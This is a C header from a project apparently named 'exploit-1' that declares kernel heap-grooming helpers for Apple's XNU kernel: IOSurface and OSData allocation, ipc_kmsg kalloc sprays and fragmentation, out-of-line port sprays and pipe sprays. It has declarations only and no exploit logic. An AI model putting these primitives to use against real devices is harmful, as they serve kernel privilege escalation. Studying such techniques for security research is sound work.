//
//  user_kernel_alloc.h
//  exploit-1
//
//  Created by Quote on 2020/12/30.
//  Copyright © 2020 Quote. All rights reserved.
//

#ifndef user_kernel_alloc_h
#define user_kernel_alloc_h

bool IOSurface_init(void);
uint32_t IOSurface_new_property_key(void);
int IOSurface_remove_property(uint32_t key);
void OSData_kmem_alloc(uint32_t property_key, void *data, size_t size, void *holedata, size_t holesize);
// with a small OSData in array[0]
void OSArray_fast_alloc(uint32_t property_key, size_t kalloc_size);

//
struct holding_port_array {
    mach_port_t *ports;
    size_t count;
};

struct holding_port_array holding_ports_create(size_t count);
void holding_ports_destroy(struct holding_port_array all_ports);
mach_port_t holding_port_grab(struct holding_port_array *holding_ports);
mach_port_t holding_port_pop(struct holding_port_array *holding_ports);

void mach_port_insert_send_right(mach_port_t port);

struct ipc_kmsg_kalloc_fragmentation_spray {
    struct holding_port_array holding_ports;
    size_t spray_size;
    size_t kalloc_size_per_port;
};

void ipc_kmsg_kalloc_fragmentation_spray_(struct ipc_kmsg_kalloc_fragmentation_spray *spray,
                                     size_t kalloc_size,
                                     size_t spray_size,
                                     size_t kalloc_size_per_port,
                                     struct holding_port_array *holding_ports);
void ipc_kmsg_kalloc_fragmentation_spray_fragment_memory_(
               struct ipc_kmsg_kalloc_fragmentation_spray *spray,
               size_t free_size,
               int from_end);


struct ipc_kmsg_kalloc_spray {
       struct holding_port_array holding_ports;
       size_t spray_size;
       size_t kalloc_allocation_size_per_port;
};

void ipc_kmsg_kalloc_spray_(struct ipc_kmsg_kalloc_spray *spray,
               const void *data,
               size_t kalloc_size,
               size_t spray_size,
               size_t kalloc_allocation_limit_per_port,
               struct holding_port_array *holding_ports);

struct ool_msg  {
    mach_msg_header_t hdr;
    mach_msg_body_t body;
    mach_msg_ool_ports_descriptor_t ool_ports;
};

struct simple_msg {
    mach_msg_header_t hdr;
    char buf[0];
};

struct simple_msg* receive_message(mach_port_t source, mach_msg_size_t size);
int send_ool_ports(mach_port_t where, mach_port_t target_port, int count, int disposition);

size_t mach_message_size_for_ipc_kmsg_size(size_t ipc_kmsg_size);
//

int spray_ool_pages(mach_port_t where, size_t alloc_size, mach_port_t *target_ports, int count, int disposition);

kern_return_t ipc_kmsg_kalloc_with_data(mach_port_t destination, void *buffer, size_t size);

int *create_pipes(size_t *pipe_count);
void close_pipes(int *pipefds, size_t pipe_count);
void pipe_close(int pipefds[2]);
size_t pipe_spray(const int *pipefds, size_t pipe_count,
                  void *pipe_buffer, size_t pipe_buffer_size,
                  void (^update)(uint32_t pipe_index, void *data, size_t size));

#endif /* user_kernel_alloc_h */
